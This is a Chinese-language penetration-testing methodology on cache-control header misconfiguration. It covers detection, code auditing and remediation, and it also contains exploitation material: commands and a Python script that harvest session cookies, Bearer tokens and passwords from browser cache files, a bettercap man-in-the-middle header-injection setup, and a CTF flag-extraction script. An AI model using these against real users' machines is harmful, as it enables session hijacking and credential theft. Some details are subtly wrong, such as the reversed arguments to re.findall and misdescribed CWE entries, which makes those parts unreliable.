# 缓存控制配置错误攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的缓存控制配置错误检测与利用流程，帮助发现和利用因 Cache-Control 等缓存头配置不当导致的敏感信息泄露漏洞。

## 1.2 适用范围

本文档适用于所有 Web 应用，特别是处理敏感数据（认证响应、个人信息、金融数据）的系统。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

缓存控制配置错误是指 Web 应用未正确设置 HTTP 缓存头（如 Cache-Control、Pragma、Expires），导致敏感响应被浏览器、代理服务器或 CDN 缓存，从而可能被未授权用户访问。

**本质问题**：
- 敏感响应未设置 `no-store` 指令
- 缓存头设置在错误的对象上（如请求而非响应）
- 缓存指令矛盾或冲突
- 代理缓存未正确配置

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-525 | 使用浏览器缓存包含敏感信息 |
| CWE-614 | Cookie 中的敏感信息在加密传输中未受保护 |
| CWE-315 | 传输中的敏感信息明文存储 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 登录响应 | 认证成功后重定向 | 会话 Cookie 被缓存 |
| 个人信息页 | 用户资料展示 | PII 数据被缓存 |
| 金融交易 | 交易确认页面 | 交易详情被缓存 |
| 医疗记录 | 病历查看 | 敏感医疗数据被缓存 |
| 管理后台 | 管理员操作响应 | 管理会话被缓存 |

## 2.3 漏洞发现方法

### 2.3.1 响应头分析

```bash
# 检查认证响应的缓存头
curl -v http://target.com/login -d "username=test&password=test" 2>&1 | grep -i "cache-control"

# 检查敏感页面的缓存头
curl -v http://target.com/dashboard 2>&1 | grep -iE "cache-control|pragma|expires"
```

**危险信号**：
- `Cache-Control: public` - 允许任何缓存存储
- `Cache-Control: max-age=3600` - 允许长时间缓存
- 缺少 `Cache-Control` 头
- 缺少 `Pragma: no-cache`
- 缺少 `Expires: 0`

### 2.3.2 代码审计

**Python/Flask 示例**：

```python
# 危险模式 1：在请求对象上设置头（无效）
@app.after_request
def set_headers(request):
    request.headers['Cache-Control'] = 'no-store'  # 错误！应该设置在 response 上
    return request

# 危险模式 2：矛盾的缓存指令
@app.after_request
def set_headers(response):
    response.headers['Cache-Control'] = 'public, max-age=0'  # 允许公共缓存
    response.headers['Pragma'] = 'no-cache'  # 矛盾
    return response

# 正确模式
@app.after_request
def set_headers(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response
```

### 2.3.3 代理缓存测试

```bash
# 通过代理服务器测试缓存
curl -v -H "Proxy-Connection: keep-alive" \
  http://proxy-server/http://target.com/dashboard

# 检查 X-Cache 或类似头
# X-Cache: HIT 表示内容来自缓存
# X-Cache: MISS 表示内容来自源服务器
```

### 2.3.4 浏览器缓存检查

```bash
# 使用浏览器开发者工具
# 1. 打开 Network 标签
# 2. 访问敏感页面
# 3. 检查响应头
# 4. 刷新页面，检查是否从缓存加载（size: memory-cache 或 disk-cache）
```

## 2.4 漏洞利用方法

### 2.4.1 共享计算机凭证窃取

**前提条件**：
- 目标应用在公共/共享计算机上使用
- 认证响应被浏览器缓存

**利用步骤**：

1. **等待受害者登录**：
   - 受害者在共享计算机上登录应用
   - 认证响应（包含 Set-Cookie）被缓存

2. **访问浏览器缓存**：
   ```bash
   # Firefox 缓存位置（Linux）
   ~/.cache/mozilla/firefox/<profile>/cache2/entries/
   
   # Chrome 缓存位置（Linux）
   ~/.cache/google-chrome/Default/Cache/
   
   # Windows Chrome 缓存
   %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\
   ```

3. **提取缓存内容**：
   ```bash
   # 使用 strings 命令搜索缓存文件
   strings /path/to/cache/* | grep -i "session="
   strings /path/to/cache/* | grep -i "Set-Cookie"
   ```

### 2.4.2 代理服务器缓存利用

**前提条件**：
- 目标应用通过代理服务器访问
- 代理服务器缓存敏感响应

**利用步骤**：

```bash
# 1. 发送请求触发缓存
curl -H "Host: target.com" http://proxy-server/login \
  -d "username=victim&password=victimpass"

# 2. 等待受害者访问（内容被缓存）

# 3. 从代理缓存提取数据
# 方法取决于代理服务器类型

# Squid 代理示例
squidclient -h proxy-server mgr:objects | grep target.com

# Varnish 示例
varnishadm "ban req.url ~ /dashboard"
varnishlog -g request -i ReqURL -o
```

### 2.4.3 CDN 缓存利用

```bash
# 检查 CDN 缓存状态
curl -v https://cdn.example.com/target.com/dashboard 2>&1 | grep -i "x-cache"

# 常见 CDN 缓存头：
# X-Cache: Hit (来自缓存)
# X-Cache: Miss (来自源站)
# CF-Cache-Status: HIT (Cloudflare)

# 如果敏感内容被 CDN 缓存，任何用户都可访问
curl https://cdn.example.com/target.com/dashboard
```

### 2.4.4 中间人缓存注入

```bash
# 使用 BetterCAP 注入缓存头
bettercap -iface wlan0

# 在 bettercap 中：
set http.proxy on
set http.proxy.inject.headers "Cache-Control: public, max-age=31536000"
http.proxy on

# 现在所有通过代理的响应都会被缓存
# 攻击者可以从代理缓存中提取敏感数据
```

## 2.5 组合攻击链

### 2.5.1 缓存控制 + 会话劫持

```
1. 受害者在共享计算机登录
   → 认证响应被浏览器缓存

2. 攻击者访问同一计算机
   → 从浏览器缓存提取会话 Cookie

3. 使用窃取的会话
   → 接管受害者账户
```

### 2.5.2 缓存控制 + 信息泄露

```
1. 管理员访问敏感管理页面
   → 管理数据被代理缓存

2. 普通用户通过同一代理访问
   → 缓存命中，获取管理数据

3. 信息泄露完成
   → 无需认证即可访问敏感信息
```

### 2.5.3 缓存控制 + XSS

```
1. 发现 XSS 漏洞
   → 注入恶意脚本

2. 脚本设置持久化缓存
   → Cache-Control: max-age=31536000

3. 恶意内容长期缓存
   → 影响所有后续访问者
```

## 2.6 后渗透利用

### 2.6.1 自动化缓存扫描

```python
import requests
from urllib.parse import urlparse

def check_cache_headers(url):
    """检查 URL 的缓存头配置"""

    response = requests.get(url)
    headers = response.headers

    issues = []

    # 检查 Cache-Control
    cache_control = headers.get('Cache-Control', '').lower()

    if 'no-store' not in cache_control:
        issues.append("Missing 'no-store' directive")

    if 'public' in cache_control:
        issues.append("Allows public caching")

    if 'max-age' in cache_control:
        max_age = cache_control.split('max-age=')[1].split(',')[0]
        if int(max_age) > 0:
            issues.append(f"Allows caching for {max_age} seconds")

    # 检查 Pragma
    if 'Pragma' not in headers:
        issues.append("Missing Pragma header")
    elif headers.get('Pragma', '').lower() != 'no-cache':
        issues.append("Pragma not set to no-cache")

    # 检查 Expires
    if 'Expires' not in headers:
        issues.append("Missing Expires header")

    return issues

# 扫描整个站点
urls_to_check = [
    'http://target.com/dashboard',
    'http://target.com/profile',
    'http://target.com/settings',
    'http://target.com/orders'
]

for url in urls_to_check:
    issues = check_cache_headers(url)
    if issues:
        print(f"\n[!] {url}")
        for issue in issues:
            print(f"    - {issue}")
```

### 2.6.2 缓存内容提取

```python
import os
import re

def extract_from_browser_cache(cache_dir):
    """从浏览器缓存提取敏感数据"""

    patterns = {
        'session_cookie': r'session=([a-zA-Z0-9._-]+)',
        'auth_token': r'Authorization:\s*Bearer\s*([a-zA-Z0-9._-]+)',
        'email': r'[\w\.-]+@[\w\.-]+\.\w+',
        'password': r'password=([^\s&]+)'
    }

    results = {key: [] for key in patterns}

    # 遍历缓存文件
    for root, dirs, files in os.walk(cache_dir):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()

                    for pattern_name, pattern in patterns.items():
                        matches = re.findall(pattern, content)
                        results[pattern_name].extend(matches)
            except:
                continue

    # 去重并打印
    for pattern_name, matches in results.items():
        unique_matches = list(set(matches))
        if unique_matches:
            print(f"\n=== {pattern_name} ===")
            for match in unique_matches:
                print(f"  {match}")

    return results
```

### 2.6.3 实战案例：CTF Flag 缓存窃取

**场景描述**：在成功提交 XSS Payload 后返回 Flag，但响应未设置 Cache-Control 头，导致 Flag 可能被浏览器缓存。

**漏洞分析**：

```python
# 脆弱代码位置：app.py:79-81
response = make_response(CONTENT_TEXTAREA_POST.format("32","Umbrella",value, result, script_content))
response.headers["X-Protection"] = "0"  # 仅设置此头
# 缺少 Cache-Control, Pragma, Expires 头
return response
```

**Flag 披露位置**：

```python
# app.py:56
if result == 'XSS':
    data = '<div class="solution-text">...Here is the flag: {1}</div>'.format(
        IMAGE_ROUTES[tag]['success'], flag
    )
    # Flag 直接嵌入响应 HTML，无缓存保护
```

**利用步骤**：

```bash
# 步骤 1：验证缓存头缺失
curl -v -X POST http://localhost:5000/page \
  -d "name=<input autofocus onfocus=alert(1)>" \
  2>&1 | grep -iE "cache-control|pragma|expires"

# 预期输出：无结果（说明缓存头缺失）

# 步骤 2：检查浏览器缓存
# Firefox: about:cache
# Chrome: chrome://net-internals/#cache

# 步骤 3：从缓存提取 Flag
# Linux Chrome 缓存位置
strings ~/.cache/google-chrome/Default/Cache/* | grep -i "flag{"

# Linux Firefox 缓存位置
strings ~/.cache/mozilla/firefox/*/cache2/entries/* | grep -i "flag{"

# Windows Chrome 缓存位置
strings "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\*" | grep -i "flag{"
```

**影响分析**：

| 风险项 | 详情 |
|-------|------|
| 缓存类型 | 浏览器磁盘缓存 |
| 持久性 | 直到缓存被清理 |
| 影响范围 | 共享计算机的所有用户 |
| 利用难度 | 低（只需访问缓存文件） |
| 检测难度 | 高（被动缓存） |

**组合攻击链**：

```
1. 攻击者在共享计算机上提交有效 XSS Payload
   → Flag 返回响应被浏览器缓存

2. 攻击者离开，受害者使用同一计算机

3. 受害者（或攻击者远程）访问浏览器缓存
   → 从缓存文件中提取 Flag

4. 无需解决 XSS 挑战即可获得 Flag
```

**自动化 Flag 提取脚本**：

```python
#!/usr/bin/env python3
"""
从浏览器缓存提取 CTF Flag
"""

import os
import re
import glob

def extract_flag_from_cache():
    """扫描浏览器缓存提取 Flag"""
    
    # 常见浏览器缓存路径
    cache_paths = [
        os.path.expanduser('~/.cache/google-chrome/Default/Cache/'),
        os.path.expanduser('~/.cache/mozilla/firefox/*/cache2/entries/'),
        os.path.expanduser('~/.cache/chromium/Default/Cache/'),
    ]
    
    # Flag 模式
    flag_patterns = [
        r'flag\{[a-f0-9-]+\}',
        r'FLAG\{[a-f0-9-]+\}',
        r'ctf\{[a-f0-9-]+\}',
    ]
    
    found_flags = []
    
    for cache_base in cache_paths:
        for cache_dir in glob.glob(cache_base):
            if os.path.exists(cache_dir):
                print(f"[*] 扫描缓存目录：{cache_dir}")
                
                for root, dirs, files in os.walk(cache_dir):
                    for file in files:
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', errors='ignore') as f:
                                content = f.read()
                                
                                for pattern in flag_patterns:
                                    matches = re.findall(content, pattern, re.IGNORECASE)
                                    if matches:
                                        found_flags.extend(matches)
                                        print(f"[+] 找到 Flag: {matches[0]}")
                        except:
                            continue
    
    return list(set(found_flags))

if __name__ == '__main__':
    flags = extract_flag_from_cache()
    if flags:
        print(f"\n[+] 共找到 {len(flags)} 个唯一 Flag:")
        for flag in flags:
            print(f"    {flag}")
    else:
        print("[-] 未在缓存中找到 Flag")
```

---

# 第三部分：附录

## 3.1 安全缓存头配置

**推荐的缓存头配置**：

```
# 对于敏感页面（认证、个人信息、金融等）
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
Expires: 0

# 对于静态资源（CSS、JS、图片）
Cache-Control: public, max-age=31536000
```

**各指令说明**：

| 指令 | 作用 |
|-----|------|
| `no-store` | 禁止任何缓存 |
| `no-cache` | 缓存前必须验证 |
| `must-revalidate` | 过期后必须验证 |
| `private` | 仅允许浏览器缓存 |
| `public` | 允许所有缓存（包括代理） |

## 3.2 框架配置示例

**Flask**：

```python
@app.after_request
def set_cache_headers(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response
```

**Nginx**：

```nginx
location /sensitive/ {
    add_header Cache-Control "no-store, no-cache, must-revalidate, private";
    add_header Pragma "no-cache";
    add_header Expires "0";
}
```

**Apache**：

```apache
<FilesMatch "\.(php|asp|aspx)$">
    Header set Cache-Control "no-store, no-cache, must-revalidate, private"
    Header set Pragma "no-cache"
    Header set Expires "0"
</FilesMatch>
```

## 3.3 工具推荐

| 工具 | 用途 |
|-----|------|
| Burp Suite | 响应头分析 |
| curl | 快速头检查 |
| Browser DevTools | 浏览器缓存检查 |
| cachetest | 缓存头测试工具 |
